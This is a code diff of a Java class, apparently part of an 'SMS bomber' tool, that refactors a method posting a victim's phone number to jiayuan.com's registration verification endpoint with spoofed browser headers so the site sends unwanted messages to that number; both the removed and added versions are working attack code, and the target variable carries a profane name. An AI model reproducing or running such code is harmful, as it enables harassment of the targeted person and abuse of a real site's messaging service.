@@ -1,18 +1,10 @@
 package com.utils.attack;
 
-import org.apache.http.HttpEntity;
-import org.apache.http.HttpStatus;
-import org.apache.http.NameValuePair;
-import org.apache.http.client.entity.UrlEncodedFormEntity;
-import org.apache.http.client.methods.CloseableHttpResponse;
-import org.apache.http.client.methods.HttpPost;
+import com.utils.HttpUtil;
 import org.apache.http.impl.client.CloseableHttpClient;
-import org.apache.http.message.BasicHeader;
-import org.apache.http.message.BasicNameValuePair;
-import org.apache.http.util.EntityUtils;
 
-import java.util.ArrayList;
-import java.util.List;
+import java.util.HashMap;
+import java.util.Map;
 
 /**
  * Created by fz on 2015/8/23.
@@ -28,45 +20,24 @@ public class ShiJiJiaYuanBomber implements MessageBomber{
     @Override
     public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception{
 
-        HttpPost httpPost = new HttpPost("http://reg.jiayuan.com/libs/xajax/reguser.server.php?processSendOrUpdateMessage");
-
-        List<NameValuePair> pairs = new ArrayList<NameValuePair>();
-        pairs.add(new BasicNameValuePair("xajax", "processSendOrUpdateMessage"));
-        pairs.add(new BasicNameValuePair("xajaxargs", "<xjxquery><q>mobile=" + fuckNo + "</q></xjxquery>"));
-        pairs.add(new BasicNameValuePair("xajaxargs", "mobile"));
-        pairs.add(new BasicNameValuePair("xajaxr", "1440322143431"));
-
-        UrlEncodedFormEntity uefEntity = new UrlEncodedFormEntity(pairs, "utf-8");
-
-        httpPost.setHeader(new BasicHeader("Accept", "*/*"));
-        httpPost.setHeader(new BasicHeader("Accept-Encoding", "gzip, deflate"));
-        httpPost.setHeader(new BasicHeader("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2"));
-        httpPost.setHeader(new BasicHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"));
-        httpPost.setHeader(new BasicHeader("DNT", "1"));
-        httpPost.setHeader(new BasicHeader("Host", "reg.jiayuan.com"));
-        httpPost.setHeader(new BasicHeader("Origin", "http://reg.jiayuan.com"));
-        httpPost.setHeader(new BasicHeader("Referer", "http://reg.jiayuan.com/signup/fillbasic.php?bd=5410&province=41&degree=30&marriage=1&height=170&degree=30"));
-        httpPost.setHeader(new BasicHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"));
-        httpPost.setHeader(new BasicHeader("X-Requested-With", "XMLHttpRequest"));
-
-        httpPost.setEntity(uefEntity);
-
-        CloseableHttpResponse httpResponse = httpClient.execute(httpPost);
-        HttpEntity entity = httpResponse.getEntity();
-
-        String result = null;
-        try{
-            if(httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK){
-                if (entity != null){
-                    result = EntityUtils.toString(entity, "utf-8");
-                }
-                EntityUtils.consume(entity);
-            }
-        }catch (Exception e){
-            e.printStackTrace();
-        }finally {
-            httpResponse.close();
-        }
+        String url = "http://reg.jiayuan.com/libs/xajax/reguser.server.php?processSendOrUpdateMessage";
+        Map headers = new HashMap();
+        headers.put("Accept", "*/*");
+        headers.put("Accept-Encoding", "gzip, deflate");
+        headers.put("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2");
+        headers.put("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+        headers.put("DNT", "1");
+        headers.put("Host", "reg.jiayuan.com");
+        headers.put("Origin", "http://reg.jiayuan.com");
+        headers.put("Referer", "http://reg.jiayuan.com/signup/fillbasic.php?bd=5410&province=41&degree=30&marriage=1&height=170&degree=30");
+        headers.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36");
+        headers.put("X-Requested-With", "XMLHttpRequest");
+        Map params = new HashMap();
+        params.put("xajax", "processSendOrUpdateMessage");
+        params.put("xajaxargs", "<xjxquery><q>mobile=" + fuckNo + "</q></xjxquery>");
+        params.put("xajaxargs", "mobile");
+        params.put("xajaxr", "1440322143431");
+        String result = HttpUtil.httpPost(url, headers, params);
         return result;
     }
 
